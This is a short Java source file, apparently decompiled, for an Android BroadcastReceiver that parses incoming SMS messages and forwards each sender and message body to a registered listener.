package com.metricsfab.ubimp.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {
    private String appName;

    private ReceiveListener listener = null;

    public SMSReceiver() {}

    public SMSReceiver(String paramString) {
        this.appName = paramString;
        Log.d(this.appName, "SMS broadcastReceiver init");
    }

    public void onReceive(Context paramContext, Intent paramIntent) {
        if (paramIntent.getAction() == "android.provider.Telephony.SMS_RECEIVED" && this.listener != null) {
            Bundle bundle = paramIntent.getExtras();
            if (bundle != null) {
                Object[] arrayOfObject = (Object[])bundle.get("pdus");
                if (arrayOfObject != null && arrayOfObject.length > 0) {
                    SmsMessage[] arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
                    for (byte b = 0; b < arrayOfSmsMessage.length; b++) {
                        arrayOfSmsMessage[b] = SmsMessage.createFromPdu((byte[])arrayOfObject[b]);
                        this.listener.onSmsReceived(arrayOfSmsMessage[b].getDisplayOriginatingAddress(), arrayOfSmsMessage[b].getDisplayMessageBody());
                    }
                } else {
                    this.listener.onSmsReceived(null, null);
                }
                return;
            }
            this.listener.onSmsReceived(null, null);
        }
    }

    public void setListener(ReceiveListener paramReceiveListener) { this.listener = paramReceiveListener; }
}
